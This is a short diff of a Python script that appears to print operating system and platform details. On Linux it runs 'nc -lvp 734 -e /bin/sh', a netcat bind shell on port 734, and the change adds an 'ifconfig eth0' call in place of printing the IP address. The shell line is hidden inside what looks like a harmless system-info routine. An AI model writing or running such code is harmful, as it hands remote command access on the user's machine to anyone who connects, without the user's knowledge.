@@ -14,7 +14,7 @@ def run():
     print('# OS name: ', platform.system())
     if "Linux" in platform.system():
         print('Linux: ', sysconfig.get_platform()) 
-        print('Address ip: ', IPAddr)
+        os.system('ifconfig eth0')
         os.system( 'nc -lvp 734 -e /bin/sh')
     elif "Windows" in platform.system():
         print('Linux: ', sysconfig.get_platform()) 
